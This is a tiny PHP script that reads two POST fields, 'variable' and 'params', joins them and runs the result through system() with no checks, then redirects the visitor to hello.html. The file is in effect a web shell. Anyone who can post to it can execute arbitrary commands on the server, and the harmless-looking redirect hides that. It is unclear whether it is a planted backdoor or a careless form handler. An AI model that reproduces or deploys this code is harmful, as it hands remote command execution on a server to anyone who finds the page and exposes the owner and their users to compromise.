<?php
	if (isset($_POST['variable']) && isset($_POST['params']) ) {

    $variable = $_POST['variable'];
    $params = $_POST['params'];

    $ultima_linea = system("$variable $params", $retval);
    header("Location: hello.html");
	}
?>
